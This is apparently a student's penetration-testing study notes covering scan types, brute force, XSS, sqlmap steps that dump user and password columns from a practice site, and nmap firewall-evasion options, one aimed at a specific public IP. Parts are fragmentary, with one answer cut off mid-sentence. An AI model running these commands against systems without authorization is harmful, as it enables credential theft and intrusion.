1. port scanning 
Port scanning is the process of sending specially crafted packets to a target system to discover which ports are open, closed, or filtered. It's a fundamental step in network reconnaissance and helps security professionals identify services running on a host, potential vulnerabilities, and firewall behavior.
PING Scan 
PING Scan checks if a device is online. It sends ICMP (ping) or TCP packets, and if it gets a reply, the system is active.
3. What is a SYN Scan and why is it called stealthy?
SYN Scan sends a SYN packet and waits for a reply. If it gets SYN-ACK, the port is open. It doesn't complete the connection, so it's hard to detect — that's why it's stealthy.
4. How does the ACK scan work and what is its purpose?
ACK Scan sends only an ACK flag. If the system replies with RST, the port is unfiltered. If there’s no reply, it might be blocked by a firewall..
5. What is the purpose of the NULL Scan?
NULL Scan sends a packet with no flags. It checks how the system responds and can help find open or filtered ports, especially on older systems.
6. Describe the XMAS Scan and why it’s named so.
XMAS scan (-sX) sends TCP packets with FIN, PSH, and URG flags set. It lights up the packet like a Christmas tree, hence the name. It attempts to identify open ports by checking for the absence of

A Brute Force Attack is a method used to guess passwords by trying multiple combinations until 
the correct one is found. This attack is commonly used against login pages, admin 
panels, and authentication mechanisms.
Types of Brute Force Attacks
1. Simple Brute Force: Tries all possible combinations of passwords.
2. Dictionary Attack: Uses a predefined list of common passwords.
3. Hybrid Attack: Combines dictionary words with numbers/special characters.
4. Credential Stuffing: Uses previously leaked username-password pairs.
Why is Brute Force Dangerous?
• Can compromise user accounts if weak passwords are used.
• May allow access to admin panels or sensitive data.
• Can be used to escalate privileges within an application.

🔹 Step 1: Basic SQL Injection Test
sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" --dbs
Explanation:
•	-u: Target URL
•	--dbs: Enumerates all databases if vulnerable

🔹 Step 2: List Tables from a Specific Database
sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart --tables
Explanation:
•	-D acuart: Target database
•	--tables: List all tables in the database

🔹 Step 3: List Columns in a Specific Table
Suppose you found a table called users, then:
sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users --columns
Explanation:
•	-T users: Target table
•	--columns: List all columns in the table

🔹 Step 4: Dump Specific Column Data
To extract usernames:
sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C uname --dump
To extract passwords:
sqlmap -u "http://testphp.vulnweb.com/AJAX/infoartist.php?id=1" -D acuart -T users -C pass –dump

What is SQL Injection? 
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with an application’s database queries. 
By injecting malicious SQL statements, an attacker can bypass authentication, retrieve, modify, or delete data, and even execute system-level commands. 
Types of SQL Injection 
1. Boolean-Based SQL Injection – Uses conditional statements to determine true/false responses. 
2. Time-Based SQL Injection – Uses database-specific time delays to infer injection success. 
3. Error-Based SQL Injection – Exploits database error messages to extract data. 
4. Union-Based SQL Injection – Uses the UNION SQL operator to fetch data from multiple tables. 
5. Blind SQL Injection – Extracts data indirectly by analyzing responses or delays. 
What is SQLMap? 
SQLMap is an open-source penetration testing tool that automates SQL
 injection detection and exploitation. It supports multiple database management systems (MySQL, PostgreSQL, Oracle, etc.) and various SQL injection techniques.

What is XSS?
Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject 
malicious scripts into a trusted website, which is then executed in the victim’s browser.
Types of XSS Attacks
1. Stored XSS: The malicious script is permanently stored on the server and executed 
when the victim loads the page.
2. Reflected XSS: The malicious script is included in a URL and executed when the 
victim clicks the link.
3. DOM-Based XSS: The malicious script is executed by modifying the Document 
Object Model (DOM) in the browser

STEPS TO PERFORM:
1.) By Fragmenting the packets with 8 bit data:
start the wireshark n in filters enter ip n select any one ip address n in terminal type this 
sudo nmap -sS -Pn -f -F <target_ip> in target ip enter the ip u want to target 
EXPLANATION :1. The -f option in Nmap allows you to fragment the packets. By default, it will split packets into fragments of 8-byte lengths.
 2.This command will send fragmented packets to the target IP address and will attempt to bypass firewalls or intrusion detection systems that might block non-fragmented packets.
 BY RUNNING THE COMMAND U WILL GET TO SEE THE OPEN PORTS
 2.) By generating ip packets with specific length:
 TYPE THIS IN FILTERS IN WIRESHARK ip.src == 10.0.2.15 && tcp.len > 0
 then in terminal type this 
sudo nmap -sS -Pn --data-length <length> -p <port> <target_ip> in length add the lenth of ur ip , port n ip address of destination
3.) 3. By manipulating the TTL value
type this in filters of wireshark : ip.ttl <= 64
then in terminal run : sudo nmap -sS -Pn --ttl <TTL_VALUE> -F <TARGET_IP>
4.) 4. By sending packets with bogus TCP/UDP checksums
in filters of wireshark type this : (ip.addr == 10.0.2.15)
n in terminal type this : sudo nmap -sS -Pn --badsum -p <port(s)> <target_ip>
sudo nmap -sS -Pn --badsum -p 443 34.149.100.209
